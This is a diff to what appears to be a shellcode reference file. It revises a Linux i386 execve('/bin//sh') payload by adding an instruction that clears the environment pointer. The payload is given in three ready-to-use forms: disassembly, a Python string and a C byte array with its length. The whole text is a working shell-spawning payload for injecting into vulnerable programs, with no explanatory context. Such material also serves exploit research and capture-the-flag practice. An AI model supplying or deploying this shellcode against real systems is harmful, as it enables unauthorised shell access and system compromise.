@@ -17,21 +17,22 @@ Disassembly of section .text:
  804806f:       50                      push   %eax
  8048070:       53                      push   %ebx
  8048071:       89 e1                   mov    %esp,%ecx
- 8048073:       b0 0b                   mov    $0xb,%al
- 8048075:       cd 80                   int    $0x80
-
+ 8048073:       89 c2                   mov    %eax,%edx
+ 8048075:       b0 0b                   mov    $0xb,%al
+ 8048077:       cd 80                   int    $0x80
 ```
 
 ```python
-SHELL_CODE = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+SHELL_CODE = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
 ```
 
 ```c
 unsigned char shellcode_i386_bin[] = {
   0x31, 0xc0, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x2f, 0x62,
-  0x69, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
+  0x69, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0x89, 0xc2, 0xb0, 0x0b, 0xcd,
+  0x80
 };
-unsigned int shellcode_i386_bin_len = 23;
+unsigned int shellcode_i386_bin_len = 25;
 ```
 
 # x64
